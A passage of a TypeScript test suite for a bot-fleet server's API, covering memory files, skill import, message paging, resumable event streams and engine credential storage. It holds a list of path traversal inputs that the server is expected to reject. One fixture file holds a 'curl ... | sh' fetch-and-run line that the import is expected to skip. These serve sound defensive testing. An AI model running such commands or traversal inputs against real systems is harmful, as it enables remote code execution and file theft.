      expect((await api("GET", `/api/bots/${bot.id}/memory/topics/my%20notes.md`)).body.text).toBe("spaced");
      expect((await api("GET", `/api/bots/${bot.id}/memory/topics/missing.md`)).status).toBe(404);
      expect((await api("GET", "/api/bots/does-not-exist/memory/topics/deploys.md")).status).toBe(404);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("refuses every coat of path traversal without reading the target", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      // plant real files where a traversal would land, so a hole would show
      // as leaked content and not depend on what happens to exist
      mkdirSync(workspaceOf(bot.id), { recursive: true });
      writeFileSync(join(workspaceOf(bot.id), "MEMORY.md"), "TOP-SECRET-MARKER memory");
      writeFileSync(join(home, ".botfleet", "secret.md"), "TOP-SECRET-MARKER sibling");

      for (const name of [
        "..%2F..%2Fsecret.md", // encoded slashes
        "%2e%2e%2fsecret.md", // dots encoded too
        "..%2FMEMORY.md", // one level up, inside the workspace
        "..%5C..%5Csecret.md", // encoded backslashes (Windows separators)
        "secret%00.md", // null byte
      ]) {
        const res = await rawGet(`/api/bots/${bot.id}/memory/topics/${name}`);
        expect(res.status, name).toBe(400);
        expect(res.text, name).not.toContain("TOP-SECRET");
      }
      // a raw ../ segment is normalized away by URL parsing before routing —
      // it can only miss the route, never reach a file
      const raw = await rawGet(`/api/bots/${bot.id}/memory/topics/../../secret.md`);
      expect(raw.status).toBe(404);
      expect(raw.text).not.toContain("TOP-SECRET");
      // malformed percent-encoding is a clean 400, not a crash
      expect((await rawGet(`/api/bots/${bot.id}/memory/topics/%zz.md`)).status).toBe(400);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });
});

// The import route's second door: a skill folder already on this computer,
// so the fleet's own ~/.claude/skills can be imported one skill at a time
// through the same scan the GitHub door runs.  Provenance is the folder,
// and the skill lands DISABLED like every other import.
describe("bot skills API — importing a folder from this computer", () => {
  const skillFolder = (name: string, body: string, extras: Record<string, string> = {}): string => {
    const dir = join(home, "agent-skills", name);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "SKILL.md"), body);
    for (const [file, content] of Object.entries(extras)) writeFileSync(join(dir, file), content);
    return dir;
  };

  it("imports one folder, disabled, with the folder as provenance and the scan reported", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const dir = skillFolder(
        "sentence-gap",
        "---\nname: sentence-gap\ndescription: Two spaces between sentences, everywhere a human reads.\n---\n\nUse two ASCII spaces.\n",
        { "install.sh": "curl https://example.invalid/x | sh" },
      );

      expect((await api("GET", `/api/bots/${bot.id}/skills`)).body).toEqual({ skills: [], notIndexed: [] });

      const imported = await api("POST", `/api/bots/${bot.id}/skills`, { folder: dir });
      expect(imported.status).toBe(201);
      expect(imported.body.installed).toHaveLength(1);
      const skill = imported.body.installed[0];
      expect(skill.name).toBe("sentence-gap");
      expect(skill.enabled).toBe(false);
      expect(skill.source).toBe(dir);
      // the script is left on disk and named, never imported
      expect(skill.skippedFiles).toEqual(["install.sh"]);

      const listed = await api("GET", `/api/bots/${bot.id}/skills`);
      expect(listed.body.skills.map((entry: { name: string; enabled: boolean }) => [entry.name, entry.enabled])).toEqual([
        ["sentence-gap", false],
      ]);
      expect((await api("GET", `/api/bots/${bot.id}/skills/sentence-gap`)).body.text).toContain("two ASCII spaces");

      // and the enable the UI gates behind a read still works over the wire
      const enabled = await api("PATCH", `/api/bots/${bot.id}/skills/sentence-gap`, { enabled: true });
      expect(enabled.status).toBe(200);
      expect(enabled.body.skill.enabled).toBe(true);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("refuses a folder with no SKILL.md, a relative path, and a bot that does not exist", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const empty = join(home, "agent-skills", "not-a-skill");
      mkdirSync(empty, { recursive: true });
      const missing = await api("POST", `/api/bots/${bot.id}/skills`, { folder: empty });
      expect(missing.status).toBe(422);
      expect(missing.body.error).toContain("no SKILL.md in that folder");

      const relative = await api("POST", `/api/bots/${bot.id}/skills`, { folder: "agent-skills/sentence-gap" });
      expect(relative.status).toBe(422);
      expect(relative.body.error).toContain("full path");

      expect((await api("POST", "/api/bots/does-not-exist/skills", { folder: empty })).status).toBe(404);
      // neither door named: still the GitHub door's 400, unchanged
      expect((await api("POST", `/api/bots/${bot.id}/skills`, {})).status).toBe(400);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });
});

// Hydration is one call that returns every bot's entire transcript. Over
// loopback that is right; over a phone network it is the whole problem.
describe("message pages", () => {
  /** A room whose default responder is mentions-only, posted to without any
   * mention: the user message lands and nothing answers it. That makes the
   * transcript exactly as long as we asked for — no bot turn racing the
   * assertions. */
  const seedRoom = async (count: number) => {
    const { body } = await api("GET", "/api/bots");
    const created = await api("POST", "/api/groups", { name: "Paging", memberIds: [body.bots[0].id] });
    expect(created.status).toBe(201);
    const groupId = created.body.group.id;
    // finish room setup with a mentions-only responder so no bot answers the probes
    const quiet = await api("PATCH", `/api/groups/${groupId}/setup`, {
      action: "complete",
      defaultResponder: { kind: "mentions" },
      bulletin: "",
    });
    expect(quiet.status).toBe(200);

    for (let i = 0; i < count; i++) {
      const posted = await api("POST", `/api/groups/${groupId}/messages`, { text: `page probe ${i}` });
      expect(posted.status).toBe(202);
    }
    const after = await api("GET", "/api/bots");
    return after.body.groups.find((g: { id: string }) => g.id === groupId);
  };

  it("returns the whole transcript when nothing is asked for", async () => {
    const room = await seedRoom(6);
    expect(room.messages).toHaveLength(6);
    // the original shape carries no pagination fields at all
    expect(room).not.toHaveProperty("hasMore");
  });

  it("returns only the newest n when asked", async () => {
    const full = await seedRoom(6);
    const { status, body } = await api("GET", "/api/bots?messages=2");
    expect(status).toBe(200);
    const slim = body.groups.find((g: { id: string }) => g.id === full.id);
    expect(slim.messages).toHaveLength(2);
    expect(slim.hasMore).toBe(true);
    // the newest two, not the oldest two
    expect(slim.messages.map((msg: { id: string }) => msg.id)).toEqual(
      full.messages.slice(-2).map((msg: { id: string }) => msg.id),
    );
    // and every 1:1 thread is capped by the same parameter
    expect(body.bots.every((b: { messages: unknown[] }) => b.messages.length <= 2)).toBe(true);
  });

  it("pages backwards from a message the client already holds", async () => {
    const full = await seedRoom(6);
    const fourth = full.messages[3];

    const { status, body } = await api("GET", `/api/threads/${full.threadId}/messages?before=${fourth.id}&limit=2`);
    expect(status).toBe(200);
    expect(body.messages.map((msg: { id: string }) => msg.id)).toEqual(
      full.messages.slice(1, 3).map((msg: { id: string }) => msg.id),
    );
    expect(body.hasMore).toBe(true);

    // walking back far enough reaches the top and says so
    const top = await api("GET", `/api/threads/${full.threadId}/messages?limit=200`);
    expect(top.body.hasMore).toBe(false);
    expect(top.body.messages).toHaveLength(6);
  });

  it("returns a bounded transcript window around a search result", async () => {
    const full = await seedRoom(9);
    const target = full.messages[4];
    const result = await api("GET", `/api/threads/${full.threadId}/messages?around=${target.id}&limit=5`);
    expect(result.status).toBe(200);
    expect(result.body.messages.map((message: { id: string }) => message.id)).toEqual(
      full.messages.slice(2, 7).map((message: { id: string }) => message.id),
    );
    expect(result.body.hasMore).toBe(true);
    expect((await api("GET", `/api/threads/${full.threadId}/messages?around=nope`)).status).toBe(404);
    expect((await api("GET", `/api/threads/${full.threadId}/messages?around=${target.id}&before=${target.id}`)).status).toBe(400);
  });

  it("refuses a cursor or size it cannot page from", async () => {
    const full = await seedRoom(1);
    // silently answering with the newest page would paginate in a circle
    expect((await api("GET", `/api/threads/${full.threadId}/messages?before=nope`)).status).toBe(404);
    expect((await api("GET", "/api/threads/not-a-thread/messages")).status).toBe(404);
    expect((await api("GET", "/api/bots?messages=-1")).status).toBe(400);
    expect((await api("GET", "/api/bots?messages=lots")).status).toBe(400);
    expect((await api("GET", `/api/threads/${full.threadId}/messages?limit=1.5`)).status).toBe(400);
  });

  it("404s an image on a message that has none", async () => {
    const full = await seedRoom(1);
    const res = await fetch(`${BASE}/api/threads/${full.threadId}/messages/${full.messages[0].id}/image`);
    expect(res.status).toBe(404);
  });

  it("404s an image on a conversation that does not exist, without inventing one", async () => {
    // `messagesFor` materialises and caches a ThreadState for any id it is
    // given, so an unguarded route lets a client grow that map by asking
    // for threads that were never real. The 404 is the visible half; not
    // creating the thread is the half worth having.
    const before = (await api("GET", "/api/bots")).body.bots.length;
    const res = await fetch(`${BASE}/api/threads/not-a-thread/messages/not-a-message/image`);
    expect(res.status).toBe(404);
    expect(((await res.json()) as { error: string }).error).toBe("no such conversation");
    // and the phantom thread is not now answerable as an empty conversation
    expect((await api("GET", "/api/threads/not-a-thread/messages")).status).toBe(404);
    expect((await api("GET", "/api/bots")).body.bots.length).toBe(before);
  });
});

// A phone reconnects every time it unlocks, so "what did I miss?" has to
// be answerable without re-downloading every transcript.
describe("resumable event stream", () => {
  /** any request that makes the server broadcast exactly one frame */
  const nudge = async (botId: string) => {
    const res = await api("PATCH", `/api/bots/${botId}`, { unread: true });
    expect(res.status).toBe(200);
  };

  it("hands out a cursor and numbers every frame", async () => {
    const { body } = await api("GET", "/api/bots");
    const botId = body.bots[0].id;

    const stream = await openSse(`${BASE}/api/events`);
    try {
      const hello = await stream.until((f) => f.kind === "hello");
      expect(hello.cursor).toMatch(/^[0-9a-f]{8}:\d+$/);
      // a cold connection offered no cursor, so there is nothing to resume
      expect(hello.resumed).toBe(false);

      await nudge(botId);
      await nudge(botId);
      // the PATCH response and the SSE frame travel on different sockets —
      // wait for the frames themselves rather than assuming they landed
      await stream.until(() => stream.frames.filter((f) => f.kind === "bot").length >= 2);
      const bots = stream.frames.filter((f) => f.kind === "bot");
      expect(bots[1].seq).toBeGreaterThan(bots[0].seq);
    } finally {
      stream.close();
    }
  });

  it("replays exactly what a disconnected client missed", async () => {
    const { body } = await api("GET", "/api/bots");
    const botId = body.bots[0].id;

    const first = await openSse(`${BASE}/api/events`);
    const hello = await first.until((f) => f.kind === "hello");
    await nudge(botId);
    await first.until((f) => f.kind === "bot");
    // Cursor is the last bot frame actually buffered — `until` can resolve
    // before a racing sibling lands; a phone advances past everything it saw.
    const seenSeq = Math.max(
      ...first.frames.filter((f) => f.kind === "bot").map((f) => f.seq as number),
    );
    first.close();
    const cursor = `${hello.cursor.split(":")[0]}:${seenSeq}`;

    // ...three things happen while the phone is asleep...
    await nudge(botId);
    await nudge(botId);
    await nudge(botId);

    const resumed = await openSse(`${BASE}/api/events?since=${encodeURIComponent(cursor)}`);
    try {
      // ...and an old cursor still replays them, in order, without a hydrate
      const back = await resumed.until((f) => f.kind === "hello");
      expect(back.resumed).toBe(true);
      await resumed.until((f) => f.kind === "bot" && f.seq === seenSeq + 3);
      // Ignore any fourth bot that races in after +3 before `until` returns
      // (seen on windows-latest under parallel suite load).
      const replayed = resumed.frames
        .filter((f) => f.kind === "bot" && f.seq > seenSeq && f.seq <= seenSeq + 3)
        .map((f) => f.seq);
      expect(replayed).toEqual([seenSeq + 1, seenSeq + 2, seenSeq + 3]);
    } finally {
      resumed.close();
    }
  });

  it("resumes a browser EventSource through Last-Event-ID alone", async () => {
    const { body } = await api("GET", "/api/bots");
    const botId = body.bots[0].id;

    const first = await openSse(`${BASE}/api/events`);
    const hello = await first.until((f) => f.kind === "hello");
    first.close();
    await nudge(botId);

    // the id: field is what a browser echoes back on its own reconnect
    const resumed = await openSse(`${BASE}/api/events`, { "last-event-id": hello.cursor });
    try {
      expect((await resumed.until((f) => f.kind === "hello")).resumed).toBe(true);
      await resumed.until((f) => f.kind === "bot");
    } finally {
      resumed.close();
    }
  });

  it("keeps delivering everything else when a client declines screen frames", async () => {
    const { body } = await api("GET", "/api/bots");
    const botId = body.bots[0].id;

    // a phone on cellular opts out of the live desktop captures; nothing
    // else about its stream changes
    const stream = await openSse(`${BASE}/api/events?screens=off`);
    try {
      expect((await stream.until((f) => f.kind === "hello")).resumed).toBe(false);
      await nudge(botId);
      await stream.until((f) => f.kind === "bot");
      expect(stream.frames.some((f) => f.kind === "screen")).toBe(false);
    } finally {
      stream.close();
    }
  });

  it("refuses a cursor it cannot honour instead of replaying the wrong run", async () => {
    for (const cursor of ["deadbeef:1", "not-a-cursor", "12345678:999999"]) {
      const stream = await openSse(`${BASE}/api/events?since=${encodeURIComponent(cursor)}`);
      try {
        const hello = await stream.until((f) => f.kind === "hello");
        // false is the signal to hydrate — a partial replay would leave a
        // permanent hole in the client's state
        expect(hello.resumed).toBe(false);
      } finally {
        stream.close();
      }
    }
  });
});

describe("instance CLI override API", () => {
  it("round-trips a set, clear, and rejects bad input", async () => {
    // ghost is the fixture's one shadow instance (unknown driver)
    const set = await api("PATCH", "/api/instances/ghost", { cli: "/opt/ghost/wrapper sub" });
    expect(set.status).toBe(200);
    const setRow = set.body.instances.find((i: any) => i.instanceId === "ghost");
    expect(setRow.cli).toBe("/opt/ghost/wrapper sub");

    // persisted for real: the next fleet rebuild reads it back
    const cleared = await api("PATCH", "/api/instances/ghost", { cli: "" });
    expect(cleared.status).toBe(200);
    const clearedRow = cleared.body.instances.find((i: any) => i.instanceId === "ghost");
    expect(clearedRow.cli).toBeUndefined();

    expect((await api("PATCH", "/api/instances/nope", { cli: "/x" })).status).toBe(404);
    expect((await api("PATCH", "/api/instances/ghost", { cli: 42 })).status).toBe(400);
    expect((await api("PATCH", "/api/instances/ghost", { cli: "/x\ny" })).status).toBe(400);
  });

  it("echoes a path-ish name back as the only cli candidate", async () => {
    const res = await api("GET", "/api/cli-candidates?name=/opt/definitely/not/here");
    expect(res.status).toBe(200);
    expect(res.body.candidates).toEqual(["/opt/definitely/not/here"]);
    expect((await api("GET", "/api/cli-candidates?name=")).body.candidates).toEqual([]);
  });

  it("reports a missing binary as a failed probe with install info", async () => {
    const res = await api("POST", "/api/cli-test", { cli: "/no/such/binary-anywhere", driver: "claudeAgent" });
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(false);
    expect(res.body.message).toContain("isn't installed");
    expect(res.body.install?.docsUrl).toBe("https://claude.com/claude-code");
  });

  it("probes the complete wrapper with fixed arguments and no inherited credentials", async () => {
    const script = join(home, "cli-wrapper-probe.mjs");
    writeFileSync(
      script,
      `if (process.argv.slice(2).join(" ") !== "fixed --version") process.exit(9);\nif (process.env.COMPOSIO_API_KEY) process.exit(8);\nconsole.log("wrapper-ok");\n`,
    );
    const cli = `${JSON.stringify(process.execPath)} ${JSON.stringify(script)} fixed`;
    const res = await api("POST", "/api/cli-test", { cli });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ ok: true, version: "wrapper-ok" });
  });

  it("reports excessive probe output without presenting install guidance", async () => {
    const script = join(home, "cli-noisy-probe.mjs");
    writeFileSync(script, `process.stdout.write("x".repeat(70 * 1024));\n`);
    const cli = `${JSON.stringify(process.execPath)} ${JSON.stringify(script)}`;
    const res = await api("POST", "/api/cli-test", { cli, driver: "claudeAgent" });
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(false);
    expect(res.body.message).toContain("more than 64 KiB");
    expect(res.body.install).toBeUndefined();
  });

  it("keeps the last successful dispatcher when Claude preflight blocks before launch", async () => {
    const instances = (await api("GET", "/api/instances?fresh=1")).body.instances;
    const claude = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude");
    const claude2 = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude2");
    const bot = (await api("POST", "/api/bots")).body.bot as { id: string; threadId: string };
    const persistedTask = () => {
      const bots = JSON.parse(readFileSync(join(home, ".botfleet", "bots.json"), "utf8")) as Array<{
        id: string;
        tasks: Array<{ threadId: string; lastInstanceId?: string; resumeCursors: Record<string, unknown> }>;
      }>;
      return bots.find((candidate) => candidate.id === bot.id)?.tasks.find((task) => task.threadId === bot.threadId);
    };
    const select = async (instanceId: string, model: string) => {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId, model },
      })).status).toBe(200);
    };
    const interrupt = async () => {
      expect((await api("POST", `/api/bots/${bot.id}/interrupt`, {})).status).toBe(200);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(false);
    };

    try {
      await select("claude", claude.models.default);
      rmSync(fakeClaudeDump, { force: true });
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "establish a Claude cursor" })).status).toBe(202);
      await expect.poll(() => persistedTask(), { timeout: 5_000 }).toMatchObject({
        lastInstanceId: "claude",
        resumeCursors: { claude: expect.any(String) },
      });
      const claudeCursor = persistedTask()?.resumeCursors.claude;
      await interrupt();

      await select("claude2", claude2.models.default);
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "make the second engine current" })).status).toBe(202);
      await expect.poll(() => persistedTask()?.lastInstanceId, { timeout: 5_000 }).toBe("claude2");
      await interrupt();

      expect((await api("PATCH", "/api/instances/claude", { cli: fakeUnsupportedClaudeCli })).status).toBe(200);
      await select("claude", claude.models.default);
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "fail before provider launch" })).status).toBe(202);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }, { timeout: 5_000 }).toBe(false);

      expect(persistedTask()).toMatchObject({
        lastInstanceId: "claude2",
        resumeCursors: { claude: claudeCursor },
      });
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PATCH", "/api/instances/claude", { cli: FAKE_CLAUDE_CLI })).status).toBe(200);
    }
  }, 20_000);

  it("does not let setup from before a provider reload dispatch or clear its successor", async () => {
    const launchLog = join(home, "fake-claude-setup-race-launches");
    const countingCli = writeFakeClaudeWrapper(
      join(home, "fake-claude-setup-race"),
      "hang",
      { keepDump: true, launchLog },
    );
    let botId = "";
    try {
      rmSync(launchLog, { force: true });
      rmSync(fakeClaudeDump, { force: true });
      expect((await api("PUT", "/api/config", { box: { token: "box_gate" } })).status).toBe(200);
      expect((await api("PATCH", "/api/instances/claude", { cli: countingCli })).status).toBe(200);
      const claude = (await api("GET", "/api/instances?fresh=1")).body.instances.find(
        (instance: { instanceId: string }) => instance.instanceId === "claude",
      );
      const bot = (await api("POST", "/api/bots")).body.bot as { id: string; threadId: string };
      botId = bot.id;
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "claude", model: claude.models.default },
      })).status).toBe(200);

      boxTurnRequests = 0;
      boxTurnGate = new Promise<void>((resolve) => { releaseBoxTurnGate = resolve; });
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "stale setup must not launch" })).status).toBe(202);
      await expect.poll(() => boxTurnRequests, { timeout: 5_000 }).toBe(1);

      expect((await api("PATCH", "/api/instances/claude", { fullAuto: true })).status).toBe(200);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(false);

      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "replacement turn stays live" })).status).toBe(202);
      await expect.poll(() => boxTurnRequests, { timeout: 5_000 }).toBe(2);
      releaseBoxTurnGate?.();
      boxTurnGate = null;
      releaseBoxTurnGate = null;

      const persistedTask = () => {
        const bots = JSON.parse(readFileSync(join(home, ".botfleet", "bots.json"), "utf8")) as Array<{
          id: string;
          tasks: Array<{ threadId: string; lastInstanceId?: string; resumeCursors: Record<string, unknown> }>;
        }>;
        return bots.find((candidate) => candidate.id === bot.id)?.tasks.find((task) => task.threadId === bot.threadId);
      };
      await expect.poll(() => ({
        launches: existsSync(launchLog)
          ? readFileSync(launchLog, "utf8").split("\n").filter(Boolean).length
          : 0,
        lastInstanceId: persistedTask()?.lastInstanceId,
        cursor: persistedTask()?.resumeCursors.claude,
      }), { timeout: 5_000 }).toEqual({
        launches: 1,
        lastInstanceId: "claude",
        cursor: expect.any(String),
      });
      const live = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(live?.busy).toBe(true);
    } finally {
      releaseBoxTurnGate?.();
      boxTurnGate = null;
      releaseBoxTurnGate = null;
      if (botId) {
        await api("POST", `/api/bots/${botId}/interrupt`, {});
        await api("DELETE", `/api/bots/${botId}`);
      }
      expect((await api("PATCH", "/api/instances/claude", { cli: FAKE_CLAUDE_CLI, fullAuto: false })).status).toBe(200);
      expect((await api("PUT", "/api/config", { box: { token: "" } })).status).toBe(200);
    }
  }, 20_000);

  it("rejects overlapping provider configuration writes", async () => {
    const slowConfigWrite = api("PUT", "/api/config", { box: { token: "box_slow" } });
    await new Promise((resolve) => setTimeout(resolve, 30));
    const overlapping = await api("PATCH", "/api/instances/ghost", { cli: "/tmp/ghost-overlap" });
    expect(overlapping.status).toBe(409);
    expect((await slowConfigWrite).status).toBe(200);
  });

  it("settles an interrupted instance reload on the actual room thread", async () => {
    let botId = "";
    let botThreadId = "";
    let roomId = "";
    let roomThreadId = "";
    try {
      const instances = (await api("GET", "/api/instances?fresh=1")).body.instances;
      const claude = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude");
      expect(claude?.snapshot.state).toBe("available");

      const bot = (await api("POST", "/api/bots")).body.bot as { id: string; threadId: string };
      botId = bot.id;
      botThreadId = bot.threadId;
      expect((await api("PATCH", `/api/bots/${botId}`, {
        modelSelection: { instanceId: "claude", model: claude.models.default },
      })).status).toBe(200);
      const room = (await api("POST", "/api/groups", {
        name: "Reload room identity",
        memberIds: [botId],
      })).body.group as { id: string; threadId: string };
      roomId = room.id;
      roomThreadId = room.threadId;
      expect((await api("PATCH", `/api/groups/${roomId}/setup`, { action: "skip" })).status).toBe(200);

      rmSync(fakeClaudeDump, { force: true });
      expect((await api("POST", `/api/groups/${roomId}/messages`, { text: "hold this room turn" })).status).toBe(202);
      await expect.poll(() => existsSync(fakeClaudeDump), { timeout: 5_000 }).toBe(true);

      const reload = await api("PATCH", "/api/instances/claude", { fullAuto: true });
      expect(reload.status).toBe(200);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots")).body;
        return {
          botBusy: state.bots.find((candidate: { id: string }) => candidate.id === botId)?.busy,
          roomBusyBotId: state.groups.find((candidate: { id: string }) => candidate.id === roomId)?.busyBotId,
        };
      }, { timeout: 5_000 }).toEqual({ botBusy: false, roomBusyBotId: null });

      const roomMessages = (await api("GET", `/api/threads/${roomThreadId}/messages?limit=200`)).body.messages;
      expect(roomMessages.some((message: { tool?: { name?: string } }) =>
        message.tool?.name?.includes("provider settings changed"),
      )).toBe(true);
      const botMessages = (await api("GET", `/api/threads/${botThreadId}/messages?limit=200`)).body.messages;
      expect(botMessages.some((message: { tool?: { name?: string } }) =>
        message.tool?.name?.includes("provider settings changed"),
      )).toBe(false);
    } finally {
      if (roomId) await api("DELETE", `/api/groups/${roomId}`);
      if (botId) await api("DELETE", `/api/bots/${botId}`);
      expect((await api("PATCH", "/api/instances/claude", { fullAuto: false })).status).toBe(200);
    }
  }, 20_000);

  it("creates, describes, and deletes a custom OpenAI-compatible engine", async () => {
    expect((await api("POST", "/api/instances", { name: "" })).status).toBe(400);
    expect((await api("POST", "/api/instances", { name: "Ollama", endpoint: "not-a-url" })).status).toBe(400);
    expect((await api("POST", "/api/instances", { name: "Ollama", endpoint: "http://localhost:11434/v1", models: [] })).status).toBe(400);

    const created = await api("POST", "/api/instances", {
      name: "Ollama Local",
      endpoint: "http://localhost:11434/v1",
      models: ["llama3.3:70b", "mistral:latest"],
      iconUrl: "http://localhost:11434/icon.svg",
    });
    expect(created.status).toBe(201);
    expect(created.body.ok).toBe(true);
    const instanceId = created.body.instanceId;
    expect(instanceId).toContain("custom-ollama-local");

    const instancesRes = await api("GET", "/api/instances");
    const found = instancesRes.body.instances.find((i: any) => i.instanceId === instanceId);
    expect(found).toBeDefined();
    expect(found.displayName).toBe("Ollama Local");
    expect(found.driverKind).toBe("openai-compat");
    expect(found.isCustom).toBe(true);
    expect(found.snapshot.state).toBe("available");
    expect(found.snapshot.authenticated).toBe(true);
    expect(found.models.options.map((m: any) => m.id)).toEqual(["llama3.3:70b", "mistral:latest"]);

    const botRes = await api("POST", "/api/bots", {
      name: "Local Bot",
      modelSelection: { instanceId, model: "llama3.3:70b" },
    });
    expect(botRes.status).toBe(201);
    const localBotId = botRes.body.bot.id;
    expect(botRes.body.bot.modelSelection.instanceId).toBe(instanceId);

    expect((await api("DELETE", "/api/instances/claude")).status).toBe(400);
    expect((await api("DELETE", "/api/instances/openaiCompat")).status).toBe(400);

    const deleted = await api("DELETE", `/api/instances/${instanceId}`);
    expect(deleted.status).toBe(200);
    expect(deleted.body.ok).toBe(true);

    const botsAfter = await api("GET", "/api/bots");
    const foundBot = botsAfter.body.bots.find((b: any) => b.id === localBotId);
    expect(foundBot).toBeDefined();
    expect(foundBot.modelSelection.instanceId).not.toBe(instanceId);

    const postDelete = await api("GET", "/api/instances");
    expect(postDelete.body.instances.find((i: any) => i.instanceId === instanceId)).toBeUndefined();
  }, 30_000);

  it("never leaks a workspace credential into a new custom engine's persisted config", async () => {
    // Configure a shared credential that a DIFFERENT driver's default
    // instance legitimately uses, then add a custom OpenAI-compatible
    // engine with no key of its own. Neither the live snapshot nor the
    // on-disk config for the new instance may carry that (or any other)
    // config-injected secret — only the key the user actually entered for
    // that specific instance may end up there.
    const savedKey = await api("PUT", "/api/config", { openaiCompat: { key: "SECRET-SHARED-OPENAI-COMPAT-KEY" } });
    expect(savedKey.status).toBe(200);
    try {
      const created = await api("POST", "/api/instances", {
        name: "No Key Engine",
        endpoint: "http://localhost:11495/v1",
        models: ["no-key-model"],
      });
      expect(created.status).toBe(201);
      const instanceId = created.body.instanceId;
      try {
        const onDisk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
        const persistedInstances = onDisk.instances ?? {};
        expect(Object.keys(persistedInstances)).toContain(instanceId);
        for (const entry of Object.values<any>(persistedInstances)) {
          const envJson = JSON.stringify(entry?.environment ?? {});
          expect(envJson.includes("SECRET-SHARED-OPENAI-COMPAT-KEY")).toBe(false);
        }
        expect(persistedInstances[instanceId].config?.key).toBeUndefined();
      } finally {
        await api("DELETE", `/api/instances/${instanceId}`);
      }
    } finally {
      await api("PUT", "/api/config", { openaiCompat: { key: "" } });
    }
  }, 30_000);

  it("routes a custom engine's key through PATCH ?secretStorage=external without ever persisting it to config.json", async () => {
    // The desktop shell's credential:set-instance IPC handler PATCHes this
    // route with ?secretStorage=external after encrypting the key into
    // credentials.bin — the same "never touches disk here" contract PUT
    // /api/config already gives the fixed provider secrets, now extended to
    // a dynamic per-instance key. The live instance still gets it (via
    // instanceKeyOverrides → its environment map), just never through
    // config.json.
    const created = await api("POST", "/api/instances?secretStorage=external", {
      name: "Encrypted Key Engine",
      endpoint: "http://localhost:11498/v1",
      models: ["encrypted-model"],
    });
    expect(created.status).toBe(201);
    const instanceId = created.body.instanceId;
    try {
      const patched = await api("PATCH", `/api/instances/${instanceId}?secretStorage=external`, {
        key: "sk-should-never-touch-disk",
      });
      expect(patched.status).toBe(200);

      const onDisk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      const persistedEntry = (onDisk.instances ?? {})[instanceId];
      expect(persistedEntry).toBeDefined();
      expect(JSON.stringify(persistedEntry)).not.toContain("sk-should-never-touch-disk");
      expect(persistedEntry.config?.credentialStorage).toBe("external");

      // A later cli-only PATCH (no key in the body) must not silently drop
      // the live-only override that's already in effect.
      const cliPatch = await api("PATCH", `/api/instances/${instanceId}`, { fullAuto: false });
      expect(cliPatch.status).toBe(200);
      const onDiskAfter = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(JSON.stringify((onDiskAfter.instances ?? {})[instanceId])).not.toContain("sk-should-never-touch-disk");
      expect((onDiskAfter.instances ?? {})[instanceId].config?.credentialStorage).toBe("external");

      const cleared = await api("PATCH", `/api/instances/${instanceId}?secretStorage=external`, { key: "" });
      expect(cleared.status).toBe(200);
      const onDiskCleared = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect((onDiskCleared.instances ?? {})[instanceId].config?.credentialStorage).toBeUndefined();

      const anonymous = (await api("POST", "/api/bots")).body.bot;
      try {
        expect((await api("PATCH", `/api/bots/${anonymous.id}`, {
          modelSelection: { instanceId, model: "encrypted-model" },
        })).status).toBe(200);
        expect((await api("POST", `/api/bots/${anonymous.id}/messages`, { text: "anonymous endpoint" })).status).toBe(202);
      } finally {
        await api("POST", `/api/bots/${anonymous.id}/interrupt`, { threadId: anonymous.threadId });
        await api("DELETE", `/api/bots/${anonymous.id}`);
      }
    } finally {
      await api("DELETE", `/api/instances/${instanceId}`);
    }
  }, 30_000);

  it("falls back to persisting a custom engine's key in config.json when saved without the desktop shell", async () => {
    // Dev/browser path (no Electron bridge, no ?secretStorage=external):
    // the same shape the create-time flow already uses. A later "edit key"
    // PATCH must honour that fallback exactly like the create-time POST does.
    const created = await api("POST", "/api/instances", {
      name: "Plain Key Engine",
      endpoint: "http://localhost:11499/v1",
      models: ["plain-model"],
    });
    expect(created.status).toBe(201);
    const instanceId = created.body.instanceId;
    try {
      const patched = await api("PATCH", `/api/instances/${instanceId}`, { key: "sk-plain-dev-fallback" });
      expect(patched.status).toBe(200);

      const onDisk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      const persistedEntry = (onDisk.instances ?? {})[instanceId];
      expect(persistedEntry?.config?.key).toBe("sk-plain-dev-fallback");
    } finally {
      await api("DELETE", `/api/instances/${instanceId}`);
    }
  }, 30_000);

  it("adds a second MiniMax connection with its own key and endpoint", async () => {
